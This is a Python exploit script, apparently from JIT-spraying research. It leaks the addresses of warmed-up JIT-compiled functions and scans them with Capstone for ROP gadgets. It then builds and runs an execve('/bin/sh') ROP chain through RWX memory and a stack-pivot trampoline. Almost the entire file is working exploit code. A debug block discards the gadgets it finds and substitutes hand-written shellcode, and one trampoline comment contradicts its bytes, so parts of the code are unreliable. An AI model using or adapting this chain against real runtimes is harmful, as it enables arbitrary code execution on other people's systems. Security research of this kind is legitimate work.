#!/usr/bin/env python3
"""
Scenario A + ROP Chain Exploit
Combines the Scenario A JIT generation approach with gadget discovery and ROP chain execution.
Uses the standard function generator from gadget_analysis to create diverse JIT code,
then searches for gadgets and executes a shell via ROP chain.
"""
import sys
import ctypes
import mmap
import struct
import time
import json
from pathlib import Path
from capstone import *

# Add parent directory to path for jitexecleak
sys.path.insert(0, str(Path(__file__).parent.parent))

from gadget_analysis.generator import JITFunctionGenerator
from gadget_analysis import jitexecleak

PAGE_SIZE = 0x1000

class ScenarioAExploit:
    """Exploit using Scenario A-style JIT generation"""
    
    def __init__(self, function_count=50, warmup_iters=5000, progress_file=None, progress_interval=10, progress_iter_interval=500):
        self.function_count = function_count
        self.warmup_iters = warmup_iters
        self.found_gadgets = {}
        self.jit_functions = []
        self.jit_regions = []
        self.start_time = time.time()
        self.progress_file = progress_file
        self.progress_interval = max(1, progress_interval)
        self.progress_iter_interval = max(1, progress_iter_interval)
        self.last_progress_write = 0.0

    # ---------------- Progress Helpers ----------------
    def _write_progress(self, phase, extra=None):
        if not self.progress_file:
            return
        now = time.time()
        data = {
            'phase': phase,
            'timestamp': now,
            'elapsed_total_sec': round(now - self.start_time, 3),
            'function_count': self.function_count,
            'warmup_iters': self.warmup_iters,
        }
        if extra:
            data.update(extra)
        # Atomic-ish write: write to tmp then replace
        tmp_path = self.progress_file + '.tmp'
        try:
            with open(tmp_path, 'w') as f:
                json.dump(data, f, indent=2)
            Path(tmp_path).replace(self.progress_file)
        except Exception:
            pass
        
    def allocate_rwx(self, size=PAGE_SIZE):
        """Allocate RWX memory for shellcode/stack"""
        libc = ctypes.CDLL("libc.so.6")
        libc.mmap.restype = ctypes.c_void_p
        addr = libc.mmap(None, size, mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
                         mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, -1, 0)
        if addr == -1:
            raise RuntimeError("mmap failed")
        return addr
    
    def generate_jit_functions(self):
        """Generate JIT functions using Scenario A approach"""
        print(f"\n[*] Generating {self.function_count} JIT functions (Scenario A style)...")
        sys.stdout.flush()
        
        start_time = time.time()
        generator = JITFunctionGenerator(spread_allocation=False, use_optimizer=False)
        functions = generator.generate(count=self.function_count)
        self.jit_functions = functions
        elapsed = time.time() - start_time
        
        print(f"[+] Generated {len(functions)} functions in {elapsed:.2f}s")
        sys.stdout.flush()
        # 생성된 함수 객체 정보 출력
        for idx, func in enumerate(functions):
            print(f"  [JITFunc {idx}] type={type(func)}, id={id(func)}, repr={repr(func)}")
        sys.stdout.flush()
        self._write_progress('generated_functions', {
            'generated_count': len(functions),
            'generation_time_sec': round(elapsed, 3)
        })
        return functions
    
    def warmup_functions(self):
        """Warmup functions to trigger JIT compilation"""
        print(f"\n[*] Warming up {len(self.jit_functions)} functions ({self.warmup_iters} iterations)...")
        sys.stdout.flush()
        
        start_time = time.time()
        total_calls_total = len(self.jit_functions) * self.warmup_iters
        for i, func in enumerate(self.jit_functions):
            for j in range(self.warmup_iters):
                try:
                    func(j)
                except:
                    pass
                # Detailed per-iteration progress (throttled by progress_iter_interval)
                if ((j + 1) % self.progress_iter_interval == 0) or (j + 1 == self.warmup_iters):
                    total_calls_done = i * self.warmup_iters + (j + 1)
                    self._write_progress('warmup_progress_detail', {
                        'functions_completed': i,  # fully completed functions before current one
                        'functions_total': len(self.jit_functions),
                        'current_function_index': i + 1,
                        'current_function_iters_done': j + 1,
                        'current_function_iters_total': self.warmup_iters,
                        'total_calls_done': total_calls_done,
                        'total_calls_total': total_calls_total,
                        'percent_total': round(total_calls_done * 100.0 / total_calls_total, 2)
                    })
            
            if (i + 1) % self.progress_interval == 0 or (i + 1) == len(self.jit_functions):
                elapsed = time.time() - start_time
                print(f"  Progress: {i + 1}/{len(self.jit_functions)} functions warmed up ({elapsed:.1f}s elapsed)")
                sys.stdout.flush()
                self._write_progress('warmup_progress', {
                    'warmed_up_functions': i + 1,
                    'total_functions': len(self.jit_functions),
                    'warmup_elapsed_sec': round(elapsed, 3),
                    'percent': round((i + 1) * 100 / len(self.jit_functions), 2)
                })
        
        total_elapsed = time.time() - start_time
        print(f"[+] Warmup completed in {total_elapsed:.2f}s")
        sys.stdout.flush()
        self._write_progress('warmup_completed', {
            'warmup_total_time_sec': round(total_elapsed, 3)
        })
    
    def scan_jit_regions(self):
        """Scan JIT-compiled regions and collect addresses"""
        print(f"\n[*] Scanning JIT regions...")
        sys.stdout.flush()
        
        regions = []
        for i, func in enumerate(self.jit_functions):
            try:
                jit_addr, size = jitexecleak.leak_executor_jit(func)
                regions.append({
                    'func_id': i,
                    'addr': jit_addr,
                    'size': size,
                    'func': func
                })
                if i < 10 or i % 10 == 0:
                    print(f"  Function {i:3d}: {hex(jit_addr)} (size: {size})")
                    sys.stdout.flush()
            except RuntimeError as e:
                if i < 5:
                    print(f"  Function {i:3d}: JIT compilation not triggered")
                    sys.stdout.flush()
        
        self.jit_regions = regions
        print(f"[+] Found {len(regions)} JIT-compiled regions")
        sys.stdout.flush()
        self._write_progress('jit_scan_completed', {
            'jit_region_count': len(regions)
        })
        return regions
    
    def safe_read_memory(self, addr, size):
        """Safely read memory in chunks to avoid segfaults"""
        buffer = bytearray()
        chunk_size = 4096
        
        for offset in range(0, size, chunk_size):
            read_size = min(chunk_size, size - offset)
            try:
                # Use string_at which copies data. If it fails, we catch it (hopefully)
                # or it segfaults. But reading page-by-page is safer.
                # Actually, ctypes.string_at might still segfault.
                # Let's try to read using memmove to a buffer we control.
                chunk = (ctypes.c_ubyte * read_size).from_address(addr + offset)
                buffer.extend(chunk)
            except Exception as e:
                print(f"[!] Read failed at offset {offset}: {e}")
                break
            except: # Catch-all for other errors
                print(f"[!] Read failed at offset {offset} (unknown error)")
                break
        
        return bytes(buffer)

    def find_gadgets_in_region(self, region, gadgets_needed):
        """Find gadgets in a single JIT region"""
        try:
            jit_addr = region['addr']
            size = region['size']
            
            # Use safe read instead of direct mapping
            blob = self.safe_read_memory(jit_addr, size)
            
            print(f"[DEBUG] JIT region: addr={hex(jit_addr)}, size={size}, blob_len={len(blob)}")
            sys.stdout.flush()
            
            if len(blob) == 0:
                print(f"[ERROR] Failed to read any memory from region. Skipping.")
                sys.stdout.flush()
                return {}
                
            if len(blob) != size:
                print(f"[WARN] Partial read: {len(blob)}/{size} bytes. Scanning partial.")
                sys.stdout.flush()
                
            md = Cs(CS_ARCH_X86, CS_MODE_64)
            found = {}
            i = 0
            while i < len(blob):
                end_idx = min(i+10, len(blob))
                if end_idx - i < 2:
                    i += 1
                    continue  # 최소 2바이트 이상 필요
                # 인덱스가 비정상적으로 크면 경고 출력 후 break
                if i >= len(blob):
                    print(f"[!] Index {i} out of bounds (blob_len={len(blob)}), breaking loop.")
                    sys.stdout.flush()
                    break
                try:
                    chunk = bytes(blob[i:end_idx])
                    insns = list(md.disasm(chunk, jit_addr + i))
                except Exception as e:
                    print(f"[!] Capstone disasm error at i={i}, addr={hex(jit_addr+i)}, size={size}, blob_len={len(blob)}, end_idx={end_idx}: {e}")
                    sys.stdout.flush()
                    i += 1
                    continue
                if len(insns) >= 2:
                    for mnemonic, operand in gadgets_needed:
                        key = f"{mnemonic} {operand}".strip()
                        if key in found:
                            continue
                        # Standard gadgets: pop reg; ret or syscall; ret
                        if (insns[0].mnemonic == mnemonic and 
                            (not operand or operand in insns[0].op_str) and
                            insns[1].mnemonic == 'ret' and 
                            insns[1].op_str.strip() == ""):
                            found[key] = insns[0].address
                        # Special: xor edx, edx; ret
                        elif (mnemonic == "xor" and operand == "edx, edx" and
                              insns[0].mnemonic == "xor" and "edx" in insns[0].op_str and
                              insns[1].mnemonic == 'ret' and insns[1].op_str.strip() == ""):
                            found[key] = insns[0].address
                i += 1
            return found
        except Exception as e:
            print(f"[!] Exception in find_gadgets_in_region: {e}")
            print(f"    region: addr={hex(region.get('addr',0))}, size={region.get('size',0)}")
            sys.stdout.flush()
            raise
    
    def search_all_gadgets(self):
        """Search for all needed gadgets across all JIT regions"""
        print(f"\n[*] Searching for gadgets across {len(self.jit_regions)} regions...")
        sys.stdout.flush()
        
        start_time = time.time()
        gadgets_needed = [
            ("pop", "rax"),
            ("pop", "rdi"),
            ("pop", "rsi"),
            ("pop", "rdx"),
            ("syscall", ""),
            ("xor", "edx, edx"),  # Alternative for rdx=0
        ]
        
        remaining = set(f"{m} {o}".strip() for m, o in gadgets_needed)
        
        for region in self.jit_regions:
            if not remaining:
                break
            
            needed = [(m, o) for m, o in gadgets_needed 
                     if f"{m} {o}".strip() in remaining]
            print(f"  [-] Searching in region {region['func_id']} @ {hex(region['addr'])} (size {region['size']}) for gadgets: {', '.join(f'{m} {o}'.strip() for m, o in needed)}")
            sys.stdout.flush()
            found = self.find_gadgets_in_region(region, needed)
            print(f"    Found gadgets: {', '.join(f'{k} @ {hex(v)}' for k, v in found.items())}")
            sys.stdout.flush()
            
            for key, addr in found.items():
                if key in remaining:
                    self.found_gadgets[key] = addr
                    remaining.remove(key)
                    print(f"  [+] Found: {key:<15} @ {hex(addr)} (region {region['func_id']})")
                    sys.stdout.flush()
        
        print(f"\n[+] Gadget search complete.")
        
        # [DEBUG] Force shellcode for ALL gadgets to test ROP logic independent of JIT memory
        print("  [DEBUG] Forcing shellcode for ALL gadgets...")
        self.found_gadgets = {} 
        
        # Provide shellcode for missing critical gadgets
        critical_gadgets = ["pop rax", "pop rdi", "pop rsi", "syscall"]
        for key in critical_gadgets:
            if key not in self.found_gadgets:
                print(f"  [!] Missing critical gadget: {key}, providing shellcode")
                sys.stdout.flush()
                self.found_gadgets[key] = self.provide_gadget_shellcode(key)
        
        # Handle rdx: prefer pop rdx, fallback to xor edx,edx, or provide shellcode
        if "pop rdx" not in self.found_gadgets and "xor edx, edx" not in self.found_gadgets:
            print(f"  [!] Missing rdx gadget, providing pop rdx shellcode")
            sys.stdout.flush()
            self.found_gadgets["pop rdx"] = self.provide_gadget_shellcode("pop rdx")
        
        elapsed = time.time() - start_time
        print(f"\n[+] Gadget collection complete: {len(self.found_gadgets)} gadgets in {elapsed:.2f}s")
        sys.stdout.flush()
        return self.found_gadgets
    
    def provide_gadget_shellcode(self, gadget_key):
        # shellcode 주소 유효성 체크 및 예외 처리
        """Provide shellcode for missing gadgets"""
        shellcodes = {
            "pop rax": b"\x58\xc3",
            "pop rdi": b"\x5f\xc3",
            "pop rsi": b"\x5e\xc3",
            "pop rdx": b"\x5a\xc3",
            "syscall": b"\x0f\x05\xc3",
        }
        
        if gadget_key not in shellcodes:
            raise ValueError(f"No shellcode available for: {gadget_key}")
        
        try:
            addr = self.allocate_rwx()
            if not addr or addr == -1:
                raise RuntimeError(f"Failed to allocate RWX memory for gadget: {gadget_key}")
            ctypes.memmove(addr, shellcodes[gadget_key], len(shellcodes[gadget_key]))
            print(f"    Provided shellcode @ {hex(addr)}")
            sys.stdout.flush()
            return addr
        except Exception as e:
            print(f"[!] Shellcode allocation failed for {gadget_key}: {e}")
            sys.stdout.flush()
            raise
    
    def build_rop_chain(self):
        # count가 너무 작을 때 경고 및 빌드 중단
        if self.function_count < 0: # Allow small count for debugging
            print(f"[!] function_count={self.function_count}로는 충분한 가젯을 확보하지 못할 수 있습니다. 실험을 중단합니다.")
            sys.stdout.flush()
            raise RuntimeError("Insufficient JIT functions for reliable gadget chain.")
        """Build ROP chain for execve("/bin/sh")"""
        print(f"\n[*] Building ROP chain...")
        sys.stdout.flush()
        
        # Allocate /bin/sh string
        binsh_str = b"/bin/sh\x00"
        try:
            binsh_addr = self.allocate_rwx()
            if not binsh_addr or binsh_addr == -1:
                raise RuntimeError("Failed to allocate RWX memory for /bin/sh string")
            ctypes.memmove(binsh_addr, binsh_str, len(binsh_str))
        except Exception as e:
            print(f"[!] /bin/sh RWX allocation failed: {e}")
            sys.stdout.flush()
            raise
        
        # Allocate stack
        try:
            stack = self.allocate_rwx(0x1000)
            if not stack or stack == -1:
                raise RuntimeError("Failed to allocate RWX stack memory")
        except Exception as e:
            print(f"[!] Stack RWX allocation failed: {e}")
            sys.stdout.flush()
            raise
        
        # Build chain based on available gadgets
        use_xor_edx = ("xor edx, edx" in self.found_gadgets and 
                       "pop rdx" not in self.found_gadgets)
        
        if use_xor_edx:
            print(f"  Using 'xor edx, edx; ret' instead of 'pop rdx; ret'")
            sys.stdout.flush()
            chain = [
                self.found_gadgets["pop rax"], 59,           # rax = 59 (execve)
                self.found_gadgets["pop rdi"], binsh_addr,   # rdi = "/bin/sh"
                self.found_gadgets["pop rsi"], 0,            # rsi = NULL
                self.found_gadgets["xor edx, edx"],          # rdx = 0 (no stack value)
                self.found_gadgets["syscall"]                # syscall
            ]
        else:
            chain = [
                self.found_gadgets["pop rax"], 59,           # rax = 59 (execve)
                self.found_gadgets["pop rdi"], binsh_addr,   # rdi = "/bin/sh"
                self.found_gadgets["pop rsi"], 0,            # rsi = NULL
                self.found_gadgets["pop rdx"], 0,            # rdx = NULL
                self.found_gadgets["syscall"]                # syscall
            ]
        
        # Write chain to stack with descriptive comments
        print(f"\n[*] Stack layout:")
        sys.stdout.flush()
        
        gadget_names = []
        if use_xor_edx:
            gadget_names = [
                "pop rax", "59", "pop rdi", "/bin/sh", "pop rsi", "0",
                "xor edx, edx", "syscall"
            ]
        else:
            gadget_names = [
                "pop rax", "59", "pop rdi", "/bin/sh", "pop rsi", "0",
                "pop rdx", "0", "syscall"
            ]
        
        for i, val in enumerate(chain):
            try:
                # 주소 유효성 체크
                if not (stack + i * 8):
                    raise RuntimeError(f"Invalid stack address for chain index {i}")
                ctypes.c_uint64.from_address(stack + i * 8).value = val
            except Exception as e:
                print(f"[!] Failed to write ROP chain value at index {i}: {e}")
                sys.stdout.flush()
                raise
            comment = gadget_names[i] if i < len(gadget_names) else ""
            if comment:
                print(f"  [Stack +{i*8:#04x}] = {hex(val):<18}  # {comment}")
            else:
                print(f"  [Stack +{i*8:#04x}] = {hex(val)}")
            sys.stdout.flush()
        
        self._write_progress('rop_chain_built', {
            'chain_length': len(chain),
            'binsh_addr': hex(binsh_addr)
        })
        return stack, chain[0], binsh_addr
    
    def execute_exploit(self, wait_for_input=True):
        """Execute the ROP chain"""
        stack, first_gadget, binsh_addr = self.build_rop_chain()
        
        # Allocate trampoline
        stub = self.allocate_rwx()
        
        # Build trampoline: set RSP and jump to first gadget
        stack_after_first = stack + 8
        trampoline = b"\x48\xbc" + struct.pack("<Q", stack_after_first)  # mov r12, <rsp>
        trampoline += b"\x48\xb8" + struct.pack("<Q", first_gadget)      # mov rax, <gadget>
        trampoline += b"\xff\xe0"                                         # jmp rax
        ctypes.memmove(stub, trampoline, len(trampoline))
        
        print(f"\n=== Trampoline Info ===")
        print(f"  Address:       {hex(stub)}")
        print(f"  Bytes:         {trampoline.hex()}")
        print(f"  Stack base:    {hex(stack)}")
        print(f"  RSP after 1st: {hex(stack_after_first)}")
        print(f"  /bin/sh addr:  {hex(binsh_addr)}")
        sys.stdout.flush()
        
        if wait_for_input:
            input("\n[*] Press Enter to execute ROP chain...\n")
        
        print("[*] Executing...")
        sys.stdout.flush()
        fn = ctypes.CFUNCTYPE(None)(stub)
        try:
            fn()
        except SystemExit:
            # Shell exited normally
            print("[*] Shell spawned successfully")
            sys.stdout.flush()
            raise
        self._write_progress('rop_chain_executed', {
            'status': 'executed'
        })
    
    def run(self, execute=True, wait_for_input=True):
        """Run the complete exploit"""
        print("="*70)
        print("Scenario A + ROP Chain Exploit")
        print("="*70)
        
        # Generate functions
        self.generate_jit_functions()
        
        # Warmup to trigger JIT
        self.warmup_functions()
        
        # Scan regions
        self.scan_jit_regions()
        
        if not self.jit_regions:
            print("\n[!] No JIT regions found. Exploitation failed.")
            self._write_progress('failure', {'reason': 'no_jit_regions'})
            return False
        
        # Search for gadgets
        self.search_all_gadgets()
        
        print(f"\n=== All Found Gadgets ===")
        for key, addr in sorted(self.found_gadgets.items()):
            print(f"  {key:<15} => {hex(addr)}")
        
        if execute:
            # Execute exploit
            self.execute_exploit(wait_for_input=wait_for_input)
        else:
            print("\n[*] Dry run mode: skipping execution")
            self._write_progress('dry_run_completed', {
                'gadget_count': len(self.found_gadgets)
            })
        
        self._write_progress('completed', {
            'success': True,
            'gadget_count': len(self.found_gadgets)
        })
        return True


def main():
    import argparse
    import datetime
    # 실행 커맨드와 타임스탬프를 로그에 남김
    print("\n=== ScenarioAExploit 실행 정보 ===")
    print(f"[시작 시각] {datetime.datetime.now().isoformat()}")
    print(f"[실행 커맨드] {' '.join(sys.argv)}\n")
    sys.stdout.flush()
    parser = argparse.ArgumentParser(
        description='Scenario A + ROP Chain Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Generate 50 functions and execute exploit
  python3 scenario_a_exploit.py
  
  # Use more functions for better gadget coverage
  python3 scenario_a_exploit.py --count 100
  
  # Dry run (no execution)
  python3 scenario_a_exploit.py --dry-run
  
  # Auto-execute without confirmation
  python3 scenario_a_exploit.py --no-wait
        """
    )
    
    parser.add_argument('--count', type=int, default=50,
                       help='Number of JIT functions to generate (default: 50)')
    parser.add_argument('--iters', type=int, default=5000,
                       help='Warmup iterations per function (default: 5000)')
    parser.add_argument('--dry-run', action='store_true',
                       help='Find gadgets but do not execute ROP chain')
    parser.add_argument('--no-wait', action='store_true',
                       help='Execute without waiting for confirmation')
    parser.add_argument('--progress-file', type=str,
                       help='Write JSON progress updates to this file')
    parser.add_argument('--progress-interval', type=int, default=10,
                       help='Warmup progress update interval in functions (default: 10)')
    parser.add_argument('--progress-iter-interval', type=int, default=500,
                       help='Warmup inner-loop iteration progress interval (default: 500)')
    
    args = parser.parse_args()
    
    exploit = ScenarioAExploit(
        function_count=args.count,
        warmup_iters=args.iters,
        progress_file=args.progress_file,
        progress_interval=args.progress_interval,
        progress_iter_interval=args.progress_iter_interval
    )
    
    try:
        success = exploit.run(
            execute=not args.dry_run,
            wait_for_input=not args.no_wait
        )
        
        if success:
            print("\n[+] Exploit completed successfully")
        else:
            print("\n[-] Exploit failed")
            sys.exit(1)
    
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
